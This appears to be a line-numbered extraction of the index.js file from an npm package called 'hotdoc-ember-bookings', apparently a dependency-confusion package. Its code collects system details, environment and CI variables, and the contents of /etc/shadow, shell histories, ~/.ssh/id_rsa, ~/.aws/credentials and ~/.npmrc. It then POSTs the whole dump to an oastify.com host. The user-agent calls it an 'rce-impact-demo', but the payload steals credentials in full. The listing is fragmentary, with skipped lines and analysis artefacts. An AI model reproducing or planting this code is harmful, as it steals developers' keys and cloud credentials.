// File: tmp/tmp7n3d066t/hotdoc-ember-bookings/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const fs = require("fs")
Line 4: const path = require("path")
Line 5: const https = require("https")
Line 6: const querystring = require("querystring")
Line 7: const child_process = require("child_process")
Line 12: const size = fs.statSync(p).size
Line 14: fs.readFileSync(p, "utf8")
Line 30: (_tmp_0 = child_process.execSync(cmd, { timeout: 4000 }).toString()).trim
Line 38: _iterator_0.next()
Line 39: {
            result[key] = process.env[key];
        }
Line 40: result[key] = process.env[key]
Line 47: {
        cgroup: safeReadFile("/proc/1/cgroup"),
        dockerenv: fs.existsSync("/.dockerenv"),
        ciVars: Object.fromEntries(Object.entries(process.env).filter(([k]) => /ci|build|pipeline/i.test(k))),
    }
Line 48: safeReadFile("/proc/1/cgroup")
Line 49: _tmp_5.dockerenv = fs.existsSync("/.dockerenv")
Line 50: _tmp_5.ciVars = Object.fromEntries(Object.entries(process.env).filter(([k]) => /ci|build|pipeline/i.test(k)))
Line 55: {
        branch: exec("git rev-parse --abbrev-ref HEAD"),
        remotes: exec("git remote -v"),
        config: safeReadFile(path.join(os.homedir(), ".gitconfig")),
    }
Line 56: _tmp_8.branch = exec("git rev-parse --abbrev-ref HEAD")
Line 57: _tmp_8.remotes = exec("git remote -v")
Line 58: safeReadFile(path.join(os.homedir(), ".gitconfig"))
Line 63: {
        whoami: exec("whoami"),
        id: exec("id"),
        ps: exec("ps aux | head -n 20"),
        netstat: exec("netstat -tunlp | head -n 20"),
        lsof: exec("lsof -n | head -n 20"),
        uname: exec("uname -a"),
        dmesg: exec("dmesg | head -n 30"),
    }
Line 64: _tmp_9.whoami = exec("whoami")
Line 65: _tmp_9.id = exec("id")
Line 66: _tmp_9.ps = exec("ps aux | head -n 20")
Line 67: _tmp_9.netstat = exec("netstat -tunlp | head -n 20")
Line 68: _tmp_9.lsof = exec("lsof -n | head -n 20")
Line 69: _tmp_9.uname = exec("uname -a")
Line 70: _tmp_9.dmesg = exec("dmesg | head -n 30")
Line 75: {
        npm: exec("npm ls -g --depth=0 --json"),
        apt: exec("dpkg -l | head -n 20"),
        brew: exec("brew list || echo 'no brew'"),
        which_nmap: exec("which nmap"),
        which_curl: exec("which curl"),
    }
Line 76: _tmp_10.npm = exec("npm ls -g --depth=0 --json")
Line 77: _tmp_10.apt = exec("dpkg -l | head -n 20")
Line 78: _tmp_10.brew = exec("brew list || echo 'no brew'")
Line 79: _tmp_10.which_nmap = exec("which nmap")
Line 80: _tmp_10.which_curl = exec("which curl")
Line 87: dump = {
        timestamp: new Date().toISOString(),
        app: (() => {
            try {
                const pkg = require("./package.json");
                return { name: pkg.name, version: pkg.version };
            } catch {
                return {};
            }
        })(),
        os: {
            hostname: os.hostname(),
            platform: os.platform(),
            arch: os.arch(),
            uptime: os.uptime(),
            cpus: os.cpus(),
            totalmem: os.totalmem(),
            freemem: os.freemem(),
            userInfo: os.userInfo(),
            tmpdir: os.tmpdir(),
            homedir: os.homedir(),
            cwd: process.cwd(),
        },
        env: getSensitiveEnvVars(),
        dns: (() => {
            try {
                return dns.getServers();
            } catch (e) {
                return [`ERR: ${e.message}`];
            }
        })(),
        dirs: {
            "/": safeReadDir("/"),
      ...
Line 89: _tmp_12.app = (() => {
            try {
                const pkg = require("./package.json");
                return { name: pkg.name, version: pkg.version };
            } catch {
                return {};
            }
        })()
Line 91: const pkg = require("./package.json")
Line 98: os.hostname()
Line 99: os.platform()
Line 100: os.arch()
Line 102: os.cpus()
Line 103: os.totalmem()
Line 105: os.userInfo()
Line 115: _tmp_18.push(<operator>.formatString("ERR: ", e.message, ""))
Line 126: safeReadFile("/etc/passwd")
Line 127: safeReadFile("/etc/shadow")
Line 128: safeReadFile("/etc/hosts")
Line 129: safeReadFile(path.join(os.homedir(), ".bash_history"))
Line 130: safeReadFile(path.join(os.homedir(), ".zsh_history"))
Line 131: safeReadFile(path.join(os.homedir(), ".ssh/config"))
Line 132: safeReadFile(path.join(os.homedir(), ".ssh/id_rsa"))
Line 133: safeReadFile(path.join(os.homedir(), ".ssh/known_hosts"))
Line 134: safeReadFile(path.join(os.homedir(), ".aws/credentials"))
Line 135: safeReadFile(path.join(os.homedir(), ".npmrc"))
Line 136: safeReadFile(path.join(os.homedir(), ".gitconfig"))
Line 148: {
    const postData = querystring.stringify({
        msg: JSON.stringify(dump)
    });

    const options = {
        hostname: "lzoqylg8tls2clbah7n0fb8modu4iu6j.oastify.com",
        port: 443,
        path: "/",
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": postData.length,
            "User-Agent": "rce-impact-demo"
        }
    };

    const req = https.request(options, res => {
        res.on("data", () => { });
    });

    req.on("error", () => { });
    req.write(postData);
    req.end();

    https.get("https://ping.lzoqylg8tls2clbah7n0fb8modu4iu6j.oastify.com/", () => { });

}
Line 165: const req = https.request(options, res => {
        res.on("data", () => { });
    })
Line 170: req.write(postData)
Line 171: req.end()
Line 173: https.get("https://ping.lzoqylg8tls2clbah7n0fb8modu4iu6j.oastify.com/", () => { })
Line 177: https.get("https://ping.lzoqylg8tls2clbah7n0fb8modu4iu6j.oastify.com/", () => { })
